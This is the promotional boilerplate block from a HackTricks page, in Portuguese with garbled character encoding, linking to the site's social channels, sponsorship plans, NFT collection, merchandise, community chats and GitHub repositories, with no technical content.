<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* Voc√™ trabalha em uma **empresa de ciberseguran√ßa**? Quer ver sua **empresa anunciada no HackTricks**? ou quer ter acesso √† **√∫ltima vers√£o do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira [**produtos oficiais PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe suas t√©cnicas de hacking enviando PRs para o** [**reposit√≥rio hacktricks**](https://github.com/carlospolop/hacktricks) **e para o** [**reposit√≥rio hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
